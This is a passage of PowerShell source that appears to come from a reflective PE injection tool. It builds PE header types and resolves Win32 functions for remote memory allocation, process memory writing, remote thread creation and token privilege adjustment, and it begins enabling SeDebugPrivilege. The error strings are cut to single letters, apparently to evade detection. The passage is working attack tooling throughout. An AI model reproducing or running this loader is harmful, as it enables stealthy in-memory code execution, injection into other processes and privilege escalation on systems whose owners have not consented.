		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object

		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object

		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal

		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}

	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}


				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "C"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF

				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "C"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "C"
		}

		return $false
	}


	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)

		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)

	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

		$PEEndAddress = $PEInfo.EndAddress

		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "T"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "T"
		}
	}


	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,

			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)

		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}


	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]

	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),

	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

	    Write-Output $TypeBuilder.CreateType()
	}



	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]

	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,

	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )


	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')

	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}


	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
